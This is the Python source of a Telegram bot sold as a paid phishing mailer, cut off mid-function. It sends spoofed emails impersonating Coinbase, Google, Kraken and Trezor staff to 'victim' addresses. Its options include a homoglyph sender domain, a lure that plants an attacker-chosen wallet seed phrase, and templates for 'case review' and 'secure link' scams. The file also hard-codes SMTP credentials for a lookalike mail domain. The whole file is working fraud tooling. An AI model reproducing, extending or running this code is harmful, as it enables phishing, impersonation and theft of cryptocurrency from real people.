import logging
import sys
import json
import traceback
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
import smtplib
import os
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

sys.stdout.reconfigure(encoding="utf-8")


file_logger = logging.getLogger("file_logger")
file_logger.setLevel(logging.INFO)


file_handler = logging.FileHandler("bot_logs.log", mode="a", encoding="utf-8")
file_handler.setLevel(logging.INFO)


formatter = logging.Formatter("%(message)s")
file_handler.setFormatter(formatter)

file_logger.addHandler(file_handler)

email_count_file = "stored/email_count.json"
whitelist_file = "stored/whitelist.json"
log_file_path = "stored/bot_logs.log"
file_handler = logging.FileHandler(log_file_path, mode="a", encoding="utf-8")

# SMTP server details

smtp_details = {

            "server": "smtppro.zoho.eu",
            "port": 465,
            "username": "coinbase@mailserver15-coinbase.com",
            "password": "ScatteredSpider1"

}



ADMIN_ID = 7056970772

AMOUNT_TOKEN = 9 
CUSTOM_VICTIM_EMAIL, CUSTOM_SUBJECT, CUSTOM_SENDER_NAME, CUSTOM_DISPLAY_EMAIL, CUSTOM_HTML = range(5)
DISPLAY_NAME, RECIPIENTS, REPRESENTATIVE, CASE_ID, SEED_PHRASE, LINK, SPOOF_EMAIL = (
    range(7)
)

global_email_count = 0
user_email_counts = {}
whitelisted_users = []

HTML_TEMPLATE_PATH = "templates/coinbase/cb2.html"
HTML_WALLET_TEMPLATE_PATH = "templates/coinbase/seed.html"
HTML_SECURE_TEMPLATE_PATH = "templates/coinbase/panel.html"
HTML_DELAY_TEMPLATE_PATH = "templates/coinbase/delay.html"
HTML_GOOGLE_TEMPLATE_PATH = "templates/google/google.html"
HTML_TREZOR_TEMPLATE_PATH = "templates/trezor/trezor.html"
balance_file = "stored/balance.json"
user_balances = {}

def load_balances():
    global user_balances
    if os.path.exists(balance_file):
        with open(balance_file, "r") as file:
            user_balances = json.load(file)
    else:
        user_balances = {}

def save_balances():
    with open(balance_file, "w") as file:
        json.dump(user_balances, file)

load_balances()

def deduct_balance(user_id: int, amount: float = 5.0) -> bool:
    user_id_str = str(user_id)
    if user_id_str not in user_balances:
        return False
    if user_balances[user_id_str] < amount:
        return False
    user_balances[user_id_str] -= amount
    save_balances()
    return True

def load_email_counts():
    global global_email_count, user_email_counts
    if os.path.exists(email_count_file):
        with open(email_count_file, "r") as file:
            data = json.load(file)
            global_email_count = data.get("global_count", 0)
            user_email_counts = data.get("user_counts", {})
    else:
        global_email_count = 0
        user_email_counts = {}

def save_email_counts():
    with open(email_count_file, "w") as file:
        json.dump(
            {"global_count": global_email_count, "user_counts": user_email_counts}, file
        )

def load_whitelist():
    global whitelisted_users
    if os.path.exists(whitelist_file):
        with open(whitelist_file, "r") as file:
            whitelisted_users = json.load(file)
    else:
        whitelisted_users = [ADMIN_ID]

def save_whitelist():
    with open(whitelist_file, "w") as file:
        json.dump(whitelisted_users, file)


def log_email_details(update: Update, command_type: str, victim_email: str, extra_info: dict = None):
    """Logs email details for each command in the required format."""
    user = update.effective_user
    username = user.username if user.username else "Unknown"
    user_id = user.id
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")


    if command_type == "wallet_coinbase":
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Seed phrase: {extra_info['seed_phrase']} | {current_time}"

    elif command_type == "secure_coinbase":
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Link: {extra_info['link']} | {current_time}"

    else:
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | {current_time}"


    file_logger.info(log_message)

async def add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return
    if len(context.args) != 2 or not context.args[1].isdigit():
        await update.message.reply_text("Usage: /add_balance <user_id> <amount>")
        return

    target_user_id = str(context.args[0])
    amount = float(context.args[1])
    if target_user_id in user_balances:
        user_balances[target_user_id] += amount
    else:
        user_balances[target_user_id] = amount
    save_balances()
    await update.message.reply_text(
        f"Added ${amount} to user {target_user_id}'s balance."
    )
    button1 = InlineKeyboardButton("💬 Start", callback_data='button1')
    button2 = InlineKeyboardButton("📊 Info", callback_data='button2')
    button3 = InlineKeyboardButton("⚙️ Admin", callback_data='button3')
    button4 = InlineKeyboardButton("❌ Close", callback_data='button4')
    
async def startt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    button1 = InlineKeyboardButton("💬 Start", callback_data='button1')
    button2 = InlineKeyboardButton("📊 Info", callback_data='button2')
    button3 = InlineKeyboardButton("⚙️ Admin", callback_data='button3')
    button4 = InlineKeyboardButton("❌ Close", callback_data='button4')
    keyboard = [
    [button1, button2],  # First row: Button 1 and Button 2 side by side
    [button3],           # Second row: Button 3
    [button4]            # Third row: Button 4
]

    reply_markup = InlineKeyboardMarkup(keyboard)
    message = await update.message.reply_text( '📧 __*Welcome to Armscary Mailer*__\n\nPress `Start` to begin sending mails\nUse `Info` to view your information', parse_mode='MarkdownV2', reply_markup=reply_markup)
    context.user_data['start_message_id'] = message.message_id
async def start2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None: 
    """Send a message when the command /start is issued."""
    button1 = InlineKeyboardButton("💬 Start", callback_data='button1')
    button2 = InlineKeyboardButton("📊 Info", callback_data='button2')
    button3 = InlineKeyboardButton("⚙️ Admin", callback_data='button3')
    button4 = InlineKeyboardButton("❌ Close", callback_data='button4')
    keyboard = [
    [button1, button2],  # First row: Button 1 and Button 2 side by side
    [button3],           # Second row: Button 3
    [button4]            # Third row: Button 4
]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.edit_text( '📧 __*Welcome to Armscary Mailer*__\n\nPress `Start` to begin sending mails\nUse `Info` to view your information', parse_mode='MarkdownV2', reply_markup=reply_markup)

async def buttonst(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Edit the start message based on the button pressed."""
    query = update.callback_query
    await query.answer()
    
    # Define the back button
    button10 = InlineKeyboardButton("⏪ Back", callback_data='back2')
    back_keyboard = [[button10]]
    reply_markup_back = InlineKeyboardMarkup(back_keyboard)

    # Change the message based on the callback data
    if query.data == 'back2':
        button1 = InlineKeyboardButton("💬 Start", callback_data='button1')
        button2 = InlineKeyboardButton("📊 Info", callback_data='button2')
        button3 = InlineKeyboardButton("⚙️ Admin", callback_data='button3')
        button4 = InlineKeyboardButton("❌ Close", callback_data='button4')
        keyboard = [
            [button1, button2],
            [button3],
            [button4]
        ]

        start_message_id = context.user_data.get('start_message_id')
        await context.bot.edit_message_text(
            chat_id=query.message.chat.id,
            message_id=start_message_id,
            text='📧 __*Welcome to Armscary Mailer*__\n\nPress `Start` to begin sending mails\nUse `Info` to view your information',
            parse_mode='MarkdownV2',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif query.data == 'button1':
        await query.edit_message_text(
            text="📧 __*Armscary Mailer*__ \n\n \[Coinbase\]\n• /employee \- Sends Coinbase Employee Verification Email\n• /panel \- Sends Coinbase Panel Link Email\n• /wallet \- Sends Wallet Email\n• /delay\- Sends Delay Email\n\n[Google]\n• /google \- Sends Employee Verification Email\n\n[Trezor]\n• /trezor \- Sends Employee Verification Email\n\n[Kraken]\n• /kraken \- Sends Kraken Employee Verification Email",
            reply_markup=reply_markup_back,
            parse_mode="MarkdownV2"
        )
    elif query.data == 'button2':
        await query.edit_message_text(
            text="📧 __*Armscary Mailer*__ \n\n For support please message t\.me/armscary",
            parse_mode="MarkdownV2",
            reply_markup=reply_markup_back
        )
    elif query.data == 'button3':
        user_id = update.effective_user.id
        if user_id != ADMIN_ID:
            await query.edit_message_text("You are not authorized to use this command.")
            return
        await query.edit_message_text(
            text="📧 __*Armscary Mailer Admin*__ \n\n /whitelist\n/add\_balance",
            reply_markup=reply_markup_back,
            parse_mode="MarkdownV2"
        )
    elif query.data == 'button4':
        await query.edit_message_text(text="reuse /start")


async def buttont(update: Update, context: ContextTypes.DEFAULT_TYPE, buttonst) -> None:
    """Edit the start message based on the button pressed."""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'coinbaseb':
       await query.edit_message_text(text="📧 __*Armscary Mailer Coinbase*_\n\n /employee_coinbase\n/secure_coinbase\n/wallet_coinbase\n\coinbase_delay", parse_mode="MarkdownV2")
    elif query.data == 'googleb':
        await query.edit_message_text(text="📧 __*Armscary Mailer Google*_\n\n /employee_google", parse_mode="MarkdownV2")
    elif query.data == 'trezorb':
        await query.edit_message_text(text="📧 __*Armscary Mailer Trezor*_\n\n /employee_trezor", parse_mode="MarkdownV2")
    elif query.data == 'krakenb':
        await query.edit_message_text(text="📧 __*Armscary Mailer Kraken*_\n\n /employee_kraken", parse_mode="MarkdownV2")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_count = user_email_counts.get(str(user_id), 0)
    balance = user_balances.get(str(user_id), 0)
    start_message = (
        "Welcome to @Mailer\n"
        "Support: @armscary\n\n"
        "[Info]\n\n"
        f"• Mails sent: {global_email_count}\n"
        f"• Your mails sent: {user_count}\n"
        f"• Your balance: ${balance:.2f}\n\n"
        "[Misc]\n\n"
        "• /id - Get your user id.\n"
        "• /cancel - Cancel sending your mail.\n"
        "• /custom_mail - Send your own mail\n\n"
        "[Coinbase]\n\n"
        "• /employee_coinbase - Send a case review coinbase email.\n"
        "• /wallet_coinbase - Send a coinbase wallet email.\n"
        "• /secure_coinbase - Send a secure link coinbase email.\n"
        "• /coinbase_delay - Send a delay email for manual review.\n\n"
        "[Google]\n\n"
        "• /employee_google - Send a Google employee email.\n\n"
        "[Kraken]\n\n"
        "• /employee_kraken - Send a Kraken employee email.\n\n"
        "[Trezor]\n\n"
        "• /employee_trezor - Send a trezor employee email.\n\n"

    )
    await update.message.reply_text(start_message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "hi /start"
    )
    await update.message.reply_text(help_text)

async def get_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await update.message.reply_text(f"Your user ID is: {user_id}")

def check_auth(update: Update) -> bool:
    return update.effective_user.id in whitelisted_users

async def unauthorized_access(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> None:
    await update.message.reply_text("Unauthorized access.")

async def whitelist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return
    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("Please provide a valid user ID to whitelist.")
        return

    new_user_id = int(context.args[0])
    if new_user_id in whitelisted_users:
        await update.message.reply_text(f"User {new_user_id} is already whitelisted.")
    else:
        whitelisted_users.append(new_user_id)
        save_whitelist()
        await update.message.reply_text(
            f"User {new_user_id} has been whitelisted successfully."
        )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not check_auth(update):
        await unauthorized_access(update)
        return ConversationHandler.END
    await update.message.reply_text("Email sending cancelled.")
    context.user_data.clear()
    return ConversationHandler.END


async def get_recipients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get recipient emails and move to spoof email selection."""
    context.user_data["recipients"] = update.message.text

    if context.user_data.get("conversation") == "employee_kraken":
        keyboard = [
            [InlineKeyboardButton("help@kraken", callback_data="help@kraken")],
            [InlineKeyboardButton("no-reply@kraken.com/help", callback_data="no-reply@kraken.com/help")]
        ]
    elif context.user_data.get("conversation") == "employee_coinbase":
        keyboard = [
            [InlineKeyboardButton("help@coinbase", callback_data="help@coinbase")],
            [InlineKeyboardButton("no-reply@coinbase.com/help", callback_data="no-reply@coinbase.com/help")],
            [InlineKeyboardButton("help@coínbase.com", callback_data="help@coínbase.com")]
        ]
    elif context.user_data.get("conversation") == "coinbase_delay":
        keyboard = [
            [InlineKeyboardButton("help@coinbase", callback_data="help@coinbase")],
            [InlineKeyboardButton("no-reply@coinbase.com/help", callback_data="no-reply@coinbase.com/help")],
            [InlineKeyboardButton("help@coínbase.com", callback_data="help@coínbase.com")]
        ]          
    elif context.user_data.get("conversation") == "employee_google":
        keyboard = [
            [InlineKeyboardButton("help@google", callback_data="help@google")],
            [InlineKeyboardButton("david@google.com/support", callback_data="david@google.com/support")]
        ]
    elif context.user_data.get("conversation") == "employee_trezor":
        keyboard = [
            [InlineKeyboardButton("help@trezor", callback_data="help@trezor")],
            [InlineKeyboardButton("no-reply@trezor.io/help", callback_data="no-reply@trezor.io/help")]
        ]
    else:
        keyboard = [
            [InlineKeyboardButton("help@coinbase", callback_data="help@coinbase")],
            [InlineKeyboardButton("no-reply@coinbase.com/help", callback_data="no-reply@coinbase.com/help")],
            [InlineKeyboardButton("help@coínbase.com", callback_data="help@coínbase.com")]
        ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
            text="📧 __*Armscary Mailer*__ \n\n❓ Sender Email:" ,
            parse_mode="MarkdownV2",
            reply_markup=reply_markup
            )
    return SPOOF_EMAIL

async def custom_mail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Initiates the custom email flow."""
    if not check_auth(update):
        await unauthorized_access(update, context)
        return ConversationHandler.END

    user_id = update.effective_user.id
    if not deduct_balance(user_id):
        await update.message.reply_text("Insufficient balance. Please top up your balance.")
        return ConversationHandler.END

    await update.message.reply_text("Enter the victim email address:")
    return CUSTOM_VICTIM_EMAIL

async def get_custom_victim_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the victim email and asks for the email subject."""
    context.user_data["victim_email"] = update.message.text
    await update.message.reply_text("Enter the subject of the email:")
    return CUSTOM_SUBJECT

async def get_custom_subject(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the subject and asks for the sender name."""
    context.user_data["subject"] = update.message.text
    await update.message.reply_text("Enter the display name:")
    return CUSTOM_SENDER_NAME

async def get_custom_sender_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the sender name and asks for the display email."""
    context.user_data["sender_name"] = update.message.text
    await update.message.reply_text("Enter the spoofed email (ex. help@coinbase):")
    return CUSTOM_DISPLAY_EMAIL

async def get_custom_display_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the display email and asks for the HTML file to send."""
    context.user_data["display_email"] = update.message.text
    await update.message.reply_text("Upload the HTML file:")
    return CUSTOM_HTML

async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives the HTML file and sends the email."""
    if update.message.document:
        file = await update.message.document.get_file()
        html_content = await file.download_as_bytearray()

      
        context.user_data["html_content"] = html_content.decode("utf-8")

  
        victim_email = context.user_data["victim_email"]
        subject = context.user_data["subject"]
        sender_name = context.user_data["sender_name"]
        display_email = context.user_data["display_email"]
        html_body = context.user_data["html_content"]

  
        msg = MIMEMultipart("related")
        msg["Subject"] = subject
        msg["From"] = f"{sender_name} <{display_email}>"
        msg["To"] = victim_email
        msg.attach(MIMEText(html_body, "html", "utf-8"))

        try:
            send_email_through_smtp(
                sender_name,
                smtp_details["username"],
                subject,
                msg,
                victim_email
            )
            await update.message.reply_text("Custom email sent successfully!")
        except Exception as e:
            await update.message.reply_text(f"Failed to send email: {str(e)}")

   
        context.user_data.clear()
        return ConversationHandler.END
    else:
        await update.message.reply_text("Please upload a valid HTML file.")
        return CUSTOM_HTML

async def wallet_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Coinbase wallet email, asks only for the seed phrase."""
    if not check_auth(update):
        await unauthorized_access(update, context)
        return ConversationHandler.END

    user_id = update.effective_user.id
    if not deduct_balance(user_id):
        await update.message.reply_text(
            "Insufficient balance. Please top up your balance."
        )
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["conversation"] = "wallet_coinbase"
    await update.message.reply_text(
            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Recipent Email:" ,
            parse_mode="MarkdownV2"
            )
    return RECIPIENTS

async def employee_google(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Google employee email with balance deduction."""
    if not check_auth(update):
        await unauthorized_access(update, context)
        return ConversationHandler.END

    user_id = update.effective_user.id
    if not deduct_balance(user_id):
        await update.message.reply_text(
            "Insufficient balance. Please top up your balance."
        )
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["conversation"] = "employee_google"
    await update.message.reply_text(
            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Recipent Email:" ,
            parse_mode="MarkdownV2"
            )
    return RECIPIENTS

async def secure_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for secure Coinbase emails with balance deduction."""
    if not check_auth(update):
        await unauthorized_access(update, context)
        return ConversationHandler.END

    user_id = update.effective_user.id
    if not deduct_balance(user_id):
        await update.message.reply_text(
            "Insufficient balance. Please top up your balance."
        )
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["conversation"] = "secure_coinbase"
    await update.message.reply_text(
            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Recipent Email:" ,
            parse_mode="MarkdownV2"
            )
    return RECIPIENTS

async def employee_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Coinbase employee email with balance deduction."""
    if not check_auth(update):
        await unauthorized_access(update, context)
        return ConversationHandler.END

    user_id = update.effective_user.id
    if not deduct_balance(user_id):
        await update.message.reply_text(
            "Insufficient balance. Please top up your balance."
        )
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["conversation"] = "employee_coinbase"
    await update.message.reply_text(
            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Recipent Email:" ,
            parse_mode="MarkdownV2"
            )
    return RECIPIENTS

async def spoof_email_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["display_email"] = query.data
    await query.edit_message_text(text=f"Spoofing email as: {query.data}")

    if context.user_data.get("conversation") == "coinbase_delay":
        await query.message.reply_text("Enter the amount and token symbol for the transaction (e.g., '1000 USDC' or '1 BTC'):")
        return AMOUNT_TOKEN
    elif context.user_data.get("conversation") == "wallet_coinbase":
        await query.message.reply_text("Enter the seed phrase:")
        return SEED_PHRASE
    else:
        await query.message.reply_text(
            text="📧 __*Armscary Mailer*__ \n\n❓ Enter Representative Name:" ,
            parse_mode="MarkdownV2"
            )
        return REPRESENTATIVE

    
async def get_amount_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:

        user_input = update.message.text.strip().split()
        if len(user_input) != 2:
            await update.message.reply_text("Please enter a valid amount and token symbol, e.g., '1000 USDC'.")
            return AMOUNT_TOKEN
        
    
        amount = (user_input[0])
        token_symbol = user_input[1].upper()

        context.user_data["amount"] = amount
        context.user_data["token_symbol"] = token_symbol

        await update.message.reply_text(f"Amount set to: {amount}, Token symbol set to: {token_symbol}. Now enter the delay link:")
        return LINK
    except ValueError:
        await update.message.reply_text("Please enter a valid number for the amount.")
        return AMOUNT_TOKEN



async def get_representative(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["representative"] = update.message.text

    if context.user_data.get("conversation") == "secure_coinbase":
        await update.message.reply_text("Enter the case ID:")
        return CASE_ID
    else:
         await update.message.reply_text(
            text="📧 __*Armscary Mailer*__ \n\n ❓Enter Case ID:" ,
            parse_mode="MarkdownV2"
            )
    return CASE_ID

async def get_case_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["case_id"] = update.message.text

    if context.user_data.get("conversation") == "employee_trezor":
        recipients = context.user_data["recipients"]
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]
        display_email = context.user_data["display_email"]


        message = await send_employee_trezor_email(
            update, recipients, representative, case_id, display_email
        )
        await update.message.reply_text(message)
        return ConversationHandler.END
    elif context.user_data.get("conversation") == "employee_kraken":
        recipients = context.user_data["recipients"]
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]
        display_email = context.user_data["display_email"]


        message = await send_employee_kraken_email(
            update, recipients, representative, case_id, display_email
        )
        await update.message.reply_text(message)
        return ConversationHandler.END
    elif context.user_data.get("conversation") == "secure_coinbase":
        await update.message.reply_text("Enter the secure link:")
        return LINK
    elif context.user_data.get("conversation") == "employee_coinbase":
        recipients = context.user_data["recipients"]
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]
        display_email = context.user_data["display_email"]


        message = await send_employee_coinbase_email(
            update, recipients, representative, case_id, display_email
        )
        await update.message.reply_text(
            text="📧 __*Armscary Mailer*__ \n\n ✅ Coinbase Employee Verification Sent\." ,
            parse_mode="MarkdownV2"
            )
        return ConversationHandler.END
    else:

        recipients = context.user_data["recipients"]
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]
        display_email = context.user_data["display_email"]

        message = await send_employee_google_email(
            update, recipients, representative, case_id, display_email
        )
        await update.message.reply_text(message)
        return ConversationHandler.END


async def get_seed_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["seed_phrase"] = update.message.text
    recipients = context.user_data["recipients"]
    seed_phrase = context.user_data["seed_phrase"]
    display_email = context.user_data["display_email"]

    message = await send_wallet_coinbase_email(
        update, recipients, seed_phrase, display_email
    )
    await update.message.reply_text(message)
    return ConversationHandler.END

async def get_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["link"] = update.message.text


    recipients = context.user_data["recipients"]
    link = context.user_data["link"]
    display_email = context.user_data["display_email"]  

    if context.user_data.get("conversation") == "coinbase_delay":
       
        message = await send_coinbase_delay_email(
            update, context, recipients, link, display_email 
        )
        await update.message.reply_text(message)
        return ConversationHandler.END
    
    else:
       
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]

        message = await send_secure_coinbase_email(
            update, recipients, link, representative, case_id, display_email
        )
        await update.message.reply_text(message)

    context.user_data.clear()
    return ConversationHandler.END





async def send_employee_coinbase_email(
    context, recipients, representative, case_id, display_email
):
    """Send the Employee Coinbase Email."""
    template_path = HTML_TEMPLATE_PATH  

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()

   
    html_body = html_body.replace(
        "mark", representative
    ) 
    html_body = html_body.replace("897281", case_id)

    msg = MIMEMultipart("related")
    msg["Subject"] = "Case Review" 
    msg['Reply-To'] = 'help@coinbase.com'
    msg["From"] = f"Coinbase <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)

    try:

        with open("images/wallet.png", "rb") as img_file:
            img = MIMEImage(img_file.read(), name="wallet_coinbase.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)


        send_email_through_smtp(
            "Coinbase",
            smtp_details["username"],
            "Coinbase Case Review",
            msg,
            recipients,
        )
        log_email_details(context, "employee_coinbase", recipients, {"representative": representative, "case_id": case_id}) 
        return "Coinbase Employee Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"

async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_email):
    """Send the Coinbase Wallet Email."""
   
    log_email_details(
        context, "wallet_coinbase", recipients, {"seed_phrase": seed_phrase}
    )

    template_path = HTML_WALLET_TEMPLATE_PATH

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()

    html_body = html_body.replace("seed_placeholder", seed_phrase)

    msg = MIMEMultipart("related")
    msg["Subject"] = "ACTION NEEDED: Secure your assets to self-custody"
    msg['Reply-To'] = 'help@coinbase.com'
    msg["From"] = f"Coinbase <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)

    try:
        with open("images/wallet.png", "rb") as img_file:
            img = MIMEImage(img_file.read(), name="wallet_coinbase.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)

        send_email_through_smtp(
            "Coinbase",
            smtp_details["username"],
            "Secure your assets to self-custody",
            msg,
            recipients,
        )
        return "Coinbase Wallet Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"

async def send_secure_coinbase_email(
    context, recipients, link, representative, case_id, display_email
):
    """Send the Secure Coinbase Email with a link and attached images."""
    template_path = HTML_SECURE_TEMPLATE_PATH

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()


    html_body = html_body.replace("Daniel Greene", representative)
    html_body = html_body.replace("1835246", case_id)
    html_body = html_body.replace("https://link.com", link)

    msg = MIMEMultipart("related")
    msg["Subject"] = "Secure Coinbase Token"
    msg['Reply-To'] = 'help@coinbase.com'
    msg["From"] = f"Coinbase <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)


    try:


        send_email_through_smtp(
            "Coinbase",
            smtp_details["username"],
            "Secure Coinbase Token",
            msg,
            recipients,
        )
        log_email_details(context, "secure_coinbase", recipients, {"link": link}) 
        return "Coinbase Secure Link Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"

async def send_employee_google_email(
    context, recipients, representative, case_id, display_email
):
    """Send the Employee Google Email with attached images."""

    log_email_details(
        context,
        "employee_google",
        recipients,
        {"representative": representative, "case_id": case_id},
    )

    template_path = HTML_GOOGLE_TEMPLATE_PATH

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()


    html_body = html_body.replace("Mark", representative)
    html_body = html_body.replace("897281", case_id)

    msg = MIMEMultipart("related")
    msg["Subject"] = "Case Review"
    msg['Reply-To'] = 'no-reply@google.com'
    msg["From"] = f"<{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)


    try:


        send_email_through_smtp(
            "Google", smtp_details["username"], "Google Case Review", msg, recipients
        )
        return "Google Employee Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"

async def employee_kraken(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Kraken employee email with balance deduction."""
    if not check_auth(update):
        await unauthorized_access(update, context)
        return ConversationHandler.END

    user_id = update.effective_user.id
    if not deduct_balance(user_id):
        await update.message.reply_text(
            "Insufficient balance. Please top up your balance."
        )
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["conversation"] = "employee_kraken"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS

async def employee_trezor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Trezor employee email with balance deduction."""
    if not check_auth(update):
        await unauthorized_access(update, context)
        return ConversationHandler.END

    user_id = update.effective_user.id
    if not deduct_balance(user_id):
        await update.message.reply_text(
            "Insufficient balance. Please top up your balance."
        )
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["conversation"] = "employee_trezor"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS


async def send_employee_trezor_email(
    context, recipients, representative, case_id, display_email
):
    """Send the Employee Trezor Email."""
    template_path = HTML_TREZOR_TEMPLATE_PATH 

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()

  
    html_body = html_body.replace("Daniel Greene", representative)
    html_body = html_body.replace("1386215", case_id)

    msg = MIMEMultipart("related")
    msg["Subject"] = "Your case is under review"
    msg["From"] = f"Trezor <{display_email}>"
    msg['Reply-To'] = 'help@trezor.io'
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)

    try:
     
        with open("images/trezor.png", "rb") as img_file:
           
            img = MIMEImage(img_file.read(), name="trezor.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)

        send_email_through_smtp(
            "Trezor",
            smtp_details["username"],
            "Your case is under review",
            msg,
            recipients,
        )
        log_email_details(context, "employee_trezor", recipients, {"representative": representative, "case_id": case_id})
        return "Trezor Employee Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"



async def spoof_email_choice_kraken(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> int:
    """Handles the spoof email choice for Kraken."""
    query = update.callback_query
    await query.answer()
    context.user_data["display_email"] = query.data
    await query.edit_message_text(text=f"Spoofing email as: {query.data}")

   
    await query.message.reply_text("Enter the representative name:")
    return REPRESENTATIVE

async def send_employee_kraken_email(
    context, recipients, representative, case_id, display_email
):
    """Send the Employee Kraken Email with attached images."""
   
    log_email_details(
        context,
        "employee_kraken",
        recipients,
        {"representative": representative, "case_id": case_id},
    )

    template_path = "templates/kraken/kraken.html"

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()

 
    html_body = html_body.replace("Daniel Greene", representative)
    html_body = html_body.replace("1835246", case_id)

  
    msg = MIMEMultipart("related")
    msg["Subject"] = "Your case is under review"
    msg['Reply-To'] = 'no-reply@kraken.com'
    msg["From"] = f"Kraken <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)


    for image in ["images/kraken.png", "images/kraken1.png", "images/kraken2.png"]:
        try:
            with open(image, "rb") as img_file:
                img = MIMEImage(img_file.read(), name=image)
                img.add_header("Content-ID", f"<{image}>")
                msg.attach(img)
        except Exception as e:
